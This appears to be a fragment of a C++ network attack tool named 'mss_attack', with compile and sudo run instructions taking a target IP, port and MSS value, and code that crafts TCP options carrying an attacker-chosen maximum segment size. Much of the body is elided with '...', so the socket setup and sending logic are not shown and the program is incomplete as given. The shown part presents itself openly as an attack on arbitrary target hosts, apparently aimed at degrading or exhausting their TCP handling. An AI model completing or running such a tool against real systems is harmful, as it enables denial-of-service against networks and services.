// Compile: g++ -o mss_attack mss_attack.cpp
// Run: sudo ./mss_attack <target_ip> <target_port> <mss_value>
...
public:
    ...
    void attack(const char* targetIP, int targetPort, uint16_t mss) {
        ...
        options[0] = 0x01;  // NOP
        options[1] = 0x01;  // NOP
        options[2] = 0x02;  // MSS kind
        options[3] = 0x04;  // Length
        *(uint16_t*)(options + 4) = htons(mss);
    ...
    ~MSSAttack() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port> <mss>\n";
        return 1;
    }
    MSSAttack attack;
    attack.attack(argv[1], atoi(argv[2]), atoi(argv[3]));
    return 0;
}